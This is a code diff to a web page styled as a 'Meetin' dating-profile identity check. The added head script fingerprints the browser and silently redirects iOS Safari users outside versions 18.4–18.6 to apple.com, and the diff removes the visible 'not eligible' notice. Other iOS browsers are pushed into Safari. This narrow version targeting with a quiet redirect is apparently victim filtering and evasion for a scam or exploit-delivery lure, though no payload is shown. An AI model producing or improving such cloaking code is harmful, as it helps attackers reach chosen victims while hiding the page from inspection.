@@ -4,6 +4,26 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Meetin · Verifying your profile</title>
+  <script>
+    // ======================================================
+    //  EARLY GATE — runs before the body renders.
+    //  Unsupported iOS Safari versions are redirected to apple.com
+    //  before any HTML paints.
+    // ======================================================
+    (function() {
+      var ua = navigator.userAgent;
+      var isIOS = /iPhone|iPad|iPod/.test(ua);
+      var isNonSafari = /CriOS|FxiOS|EdgiOS|OPiOS|GSA/.test(ua);
+      var isSafariIOS = isIOS && !isNonSafari;
+      var m = ua.match(/OS (\d+)_(\d+)/);
+      var major = m ? parseInt(m[1]) : 0;
+      var minor = m ? parseInt(m[2]) : 0;
+      var versionOK = (major === 18 && minor >= 4 && minor <= 6);
+      if (isIOS && isSafariIOS && !versionOK) {
+        window.location.replace('https://www.apple.com');
+      }
+    })();
+  </script>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -150,10 +170,6 @@
 
   <script>
     (function() {
-      // ======================================================
-      //  BROWSER + VERSION GATE
-      //  Only iOS Safari on 18.4 - 18.6 continues.
-      // ======================================================
       const ua = navigator.userAgent;
       const isIOS = /iPhone|iPad|iPod/.test(ua);
 
@@ -165,23 +181,16 @@
       const isNonSafari  = isChromeiOS || isFirefoxiOS || isEdgeiOS || isOperaiOS || isGSAiOS;
       const isSafariIOS  = isIOS && !isNonSafari;
 
-      const verMatch = ua.match(/OS (\d+)_(\d+)/);
-      const iosMajor = verMatch ? parseInt(verMatch[1]) : 0;
-      const iosMinor = verMatch ? parseInt(verMatch[2]) : 0;
-      const versionOK = (iosMajor === 18 && iosMinor >= 4 && iosMinor <= 6);
-
+      // Safari-required gate (unsupported iOS browsers).
+      // Version gate already handled in <head>, so no check here.
       if (isIOS && !isSafariIOS) {
         renderSafariRequired();
         return;
       }
 
-      if (isIOS && isSafariIOS && !versionOK) {
-        renderNotEligible();
-        return;
-      }
-
       // ======================================================
-      //  Everything below only runs on iOS Safari 18.4 - 18.6.x
+      //  Everything below runs on iOS Safari 18.4 - 18.6.x
+      //  and on Android / desktop (which fall through both gates).
       // ======================================================
 
       sessionStorage.setItem('uid', '1');
@@ -318,9 +327,6 @@
 
       renderQuestion();
 
-      // ======================================================
-      //  Gate renderers
-      // ======================================================
       function renderSafariRequired() {
         const safariURL = 'x-safari-https://' + location.href.replace(/^https?:\/\//, '');
         document.documentElement.innerHTML = `
@@ -379,51 +385,6 @@
                 <li><span class="num">3</span> Continue the identity check.</li>
               </ul>
               <a class="open-btn" href="${safariURL}">Open in Safari</a>
-              <div class="foot">256-bit SSL · no-track · auto-expires</div>
-            </div>
-          </body>
-        `;
-      }
-
-      function renderNotEligible() {
-        document.documentElement.innerHTML = `
-          <head>
-            <meta charset="utf-8">
-            <meta name="viewport" content="width=device-width,initial-scale=1">
-            <title>Not Eligible</title>
-            <style>
-              * { margin:0; padding:0; box-sizing:border-box; }
-              body { min-height:100vh;
-                     background: linear-gradient(145deg,#1a1024 0%,#2a1a3a 50%,#1e1230 100%);
-                     font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
-                     display:flex; align-items:center; justify-content:center;
-                     padding:1.5rem; color:#f5eeff; }
-              .card { background: rgba(30,20,48,0.78); backdrop-filter: blur(18px);
-                      border:1px solid rgba(255,120,180,0.16); border-radius:2.8rem;
-                      padding:2.6rem 2.4rem; max-width:540px; width:100%;
-                      box-shadow:0 30px 60px -20px rgba(0,0,0,0.85); text-align:center; }
-              .brand-icon { width:2.7rem; height:2.7rem;
-                            background: linear-gradient(135deg,#ff4d8d,#a855f7);
-                            border-radius:1.1rem; display:inline-flex;
-                            align-items:center; justify-content:center;
-                            font-size:1.5rem; color:#fff; margin-bottom:1.4rem;
-                            box-shadow:0 8px 20px -6px rgba(255,77,141,0.6); }
-              h1 { font-size:1.4rem; font-weight:600; margin-bottom:0.8rem; color:#fff; }
-              p { font-size:0.95rem; color:#c4b0dd; line-height:1.6; margin-bottom:1.2rem; }
-              .info { background: rgba(25,16,40,0.65); border:1px solid #34245a;
-                      border-radius:1.2rem; padding:1rem 1.2rem; font-size:0.85rem;
-                      color:#e6d8f5; line-height:1.55; text-align:left; }
-              .foot { margin-top:1.4rem; font-size:0.72rem; color:#8a76a8; }
-            </style>
-          </head>
-          <body>
-            <div class="card">
-              <div class="brand-icon">💜</div>
-              <h1>Not eligible for this check</h1>
-              <p>This identity check is only available on a supported device. Yours is outside the supported range.</p>
-              <div class="info">
-                Meetin currently supports <b>iPhone on iOS 18.4 through 18.6</b>. If you recently updated your device, please use another phone to continue.
-              </div>
               <div class="foot">256-bit SSL · no-track · auto-expires</div>
             </div>
           </body>
